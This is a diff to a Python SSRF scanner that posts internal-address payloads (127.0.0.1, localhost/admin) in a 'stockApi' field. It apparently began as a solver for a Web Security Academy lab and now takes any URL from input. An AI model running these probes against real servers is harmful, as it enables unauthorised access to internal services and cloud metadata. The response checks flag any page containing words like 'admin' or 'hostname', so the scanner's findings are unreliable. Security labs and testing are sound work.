@@ -2,7 +2,6 @@ import requests
 from urllib.parse import urljoin
 import concurrent.futures
 
-# SSRF payloads
 payloads = [
     # Localhost and internal IPs
     "http://127.0.0.1",
@@ -39,55 +38,77 @@ payloads = [
     "http://localhost/admin"
 ]
 
-# Function to test a single URL with POST request
-def test_ssrf_post(base_url):
-    for payload in payloads:
-        data = {"stockApi": payload}
-        try:
-            response = requests.post(base_url, data=data, timeout=5)
-            analyze_response(response, base_url, payload)
-        except requests.RequestException as e:
-            print(f"Error testing URL: {base_url} with payload {payload}, {e}")
+def check_ssrf(base_url):
+    """
+    Checks for SSRF vulnerabilities on the given base URL using a list of payloads.
+    
+    Args:
+        base_url (str): The base URL to test for SSRF vulnerabilities.
+    
+    Returns:
+        tuple: A tuple containing a boolean indicating if vulnerabilities were found and a description string.
+    """
+    results = []
 
-# Function to analyze the response for SSRF indicators
-def analyze_response(response, url, payload=None):
-    print(f"Testing payload: {payload} on URL: {url}")
-    print(f"Response Status Code: {response.status_code}")
-    print(f"Response Headers: {response.headers}")
-    print(f"Response Text: {response.text[:500]}")  # Print first 500 characters of response text
+    def analyze_response(response, url, payload=None):
+        """
+        Analyzes the response to determine if it indicates an SSRF vulnerability.
+        
+        Args:
+            response (requests.Response): The HTTP response object.
+            url (str): The URL that was tested.
+            payload (str, optional): The payload used in the test.
+        
+        Returns:
+            str: A message indicating the detected SSRF vulnerability, or None if no vulnerability is detected.
+        """
+        if response.status_code == 200:
+            if "Admin interface" in response.text or "/admin/delete?username=carlos" in response.text:
+                return f"Admin interface accessed via SSRF: {url} with payload {payload}"
+            elif "Welcome" in response.text or "admin" in response.text.lower():
+                return f"Admin interface accessed via SSRF: {url} with payload {payload}"
+            elif "metadata" in response.text:
+                return f"AWS metadata accessed via SSRF: {url} with payload {payload}"
+            elif "project-id" in response.text or "hostname" in response.text:
+                return f"Google Cloud metadata accessed via SSRF: {url} with payload {payload}"
+            elif "kubernetes" in response.text:
+                return f"Kubernetes metadata accessed via SSRF: {url} with payload {payload}"
+        return None
 
-    if response.status_code == 200:
-        if "Admin interface" in response.text or "/admin/delete?username=carlos" in response.text:
-            print(f"Admin interface accessed via SSRF: {url} with payload {payload}")
-        elif "Welcome" in response.text or "admin" in response.text.lower():
-            print(f"Admin interface accessed via SSRF: {url} with payload {payload}")
-        elif "metadata" in response.text:
-            print(f"AWS metadata accessed via SSRF: {url} with payload {payload}")
-        elif "project-id" in response.text or "hostname" in response.text:
-            print(f"Google Cloud metadata accessed via SSRF: {url} with payload {payload}")
-        elif "kubernetes" in response.text:
-            print(f"Kubernetes metadata accessed via SSRF: {url} with payload {payload}")
-        else:
-            print(f"No SSRF vulnerability detected: {url} with payload {payload}")
-    else:
-        print(f"No SSRF vulnerability detected: {url} with payload {payload}")
+    def test_ssrf_post(base_url):
+        """
+        Tests for SSRF vulnerabilities using POST requests with various payloads.
+        
+        Args:
+            base_url (str): The base URL to test.
+        
+        Returns:
+            list: A list of detected SSRF vulnerabilities from the test.
+        """
+        test_results = []
+        for payload in payloads:
+            data = {"stockApi": payload}
+            try:
+                response = requests.post(base_url, data=data, timeout=5)
+                result = analyze_response(response, base_url, payload)
+                if result:
+                    test_results.append(result)
+            except requests.RequestException as e:
+                test_results.append(f"Error testing URL: {base_url} with payload {payload}, {e}")
+        return test_results
 
-# Function to scan a list of URLs
-def scan_urls(urls):
+    # Adjusted threading logic to ensure proper result collection
     with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-        futures = []
-        for url in urls:
-            print(f"Testing {url}")
-            futures.append(executor.submit(test_ssrf_post, url))
-        concurrent.futures.wait(futures)
+        future_to_url = {executor.submit(test_ssrf_post, base_url): base_url}
+        for future in concurrent.futures.as_completed(future_to_url):
+            results.extend(future.result())
 
-# Main function
-def main():
-    urls_to_test = [
-        "https://0a0200d9044222618175fea1006600b3.web-security-academy.net/product/stock"
-        # Add more URLs to test if needed
-    ]
-    scan_urls(urls_to_test)
+    if results:
+        return True, "\n".join(results)
+    else:
+        return False, "No SSRF vulnerabilities detected."
 
 if __name__ == "__main__":
-    main()
+    target_url = input('Enter the URL to test for SSRF vulnerability: ')
+    vulnerabilities_found, description = check_ssrf(target_url)
+    print(description)
